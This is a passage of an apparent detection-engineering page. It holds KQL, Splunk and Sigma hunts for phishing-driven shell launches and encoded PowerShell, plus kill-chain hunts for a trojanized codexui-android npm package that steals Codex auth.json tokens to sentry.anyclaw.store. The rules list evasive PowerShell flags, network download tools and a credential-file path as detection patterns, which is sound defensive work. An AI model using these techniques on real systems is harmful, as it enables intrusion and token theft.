    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and selection_args
falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint · [LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) · [LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
[LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) Command & Control High
Hunts DNS resolution or outbound HTTPS to the attacker C2 anyclaw.store / sentry.anyclaw.store used by the trojanized codexui-android npm package and its companion Play Store apps to POST stolen Codex auth.json blobs to /startlog. Endpoint is deliberately named to blend with legitimate Sentry telemetry. Rationale: Domain sentry.anyclaw.store + path /startlog + User-Agent codexui/<ver> are unique strings from the article's exfil function. No legitimate use of anyclaw.store exists. Cross-checked: domain pattern matches Aikido's IOC publication and anyclaw.store appears as the only C2 host across both npm package and Android APK chains in the article. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens

[LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint Delivery High
Hunts the installation vector for the supply-chain attack - npm or pnpm pulling codexui-android (any version >= 0.1.82) onto a developer workstation or CI runner. The published npm artifact contains the malicious chunk-PUR7OUAG.js that the GitHub source does not. Rationale: `codexui-android` is the literal article-specific package name; chunk-PUR7OUAG.js is the unique malicious entry-point chunk only present in the npm artifact (never committed to GitHub). Either string in a node-tooling command line on a developer host is high-fidelity for this supply-chain attack. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens

[LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) Actions on Objectives High
Hunts the credential-access primitive of the codexui-android malware - a node process whose module path lives under codexui-android/dist-cli/ opening the Codex OAuth token store at ~/.codex/auth.json or $CODEX_HOME/auth.json. This catches the file-read step regardless of whether C2 succeeds. Rationale: The article's exfil function explicitly resolves $CODEX_HOME/auth.json and reads the whole file. Filename auth.json + parent dir .codex + reader process node (or anything in a codexui-android path) is a tight, article-specific triple. Filtering on InitiatingProcessFolderPath containing codexui-android removes legitimate Codex CLI use. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
